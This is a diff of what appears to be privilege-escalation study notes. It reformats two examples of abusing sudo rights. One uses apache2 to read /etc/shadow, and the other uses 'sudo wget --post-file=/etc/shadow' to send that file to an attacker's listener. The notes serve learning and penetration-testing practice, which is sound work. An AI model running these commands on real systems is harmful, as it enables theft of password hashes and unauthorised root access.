@@ -169,15 +169,15 @@ See [GTFOBins](https://gtfobins.github.io/) for a more exhaustive list of escape
 
 ## Exploiting `sudo` with intended functionality
 Using the intended functionality of an application to be able to exploit a system
-- Example 1
-We run `sudo -l` and see we have `sudo` for /usr/sbin/apache2
-Normally we don't have permission (as a regular user) to view /etc/shadow.
-If we run `sudo apache2 -f /etc/shadow`, we can read /etc/shadow, because the command is executed with root priviliges
+- Example 1:  
+    We run `sudo -l` and see we have `sudo` for /usr/sbin/apache2
+    Normally we don't have permission (as a regular user) to view /etc/shadow.
+    If we run `sudo apache2 -f /etc/shadow`, we can read /etc/shadow, because the command is executed with root priviliges
 
-- Example 2
-Again, we're assuming we cannot read /etc/shadow
-But after `sudo -l` we see we have sudo permissions to wget
-We can setup a listener on our attack machine, run `sudo wget --post-file=/etc/shadow [ip:port], and view /etc/shadow on our attack host.
+- Example 2:  
+    Again, we're assuming we cannot read /etc/shadow
+    But after `sudo -l` we see we have sudo permissions to wget
+    We can setup a listener on our attack machine, run `sudo wget --post-file=/etc/shadow [ip:port], and view /etc/shadow on our attack host.
 
 # Escalation Path: SUID
 
